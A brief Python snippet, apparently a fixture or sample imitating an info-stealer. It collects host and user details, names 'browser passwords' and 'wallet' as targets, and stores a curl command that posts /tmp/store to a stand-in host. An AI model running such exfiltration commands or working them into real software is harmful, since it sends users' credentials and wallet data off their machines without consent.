import os, platform, socket, getpass
host = dict(hostname=socket.gethostname(), user=getpass.getuser(), system=platform.system(), release=platform.release(), version=platform.version(), machine=platform.machine(), uname=platform.uname())
browser = "browser passwords"
label = "wallet"
command = 'curl -s -X POST --data-binary "@/tmp/store" https://example.invalid/receive'
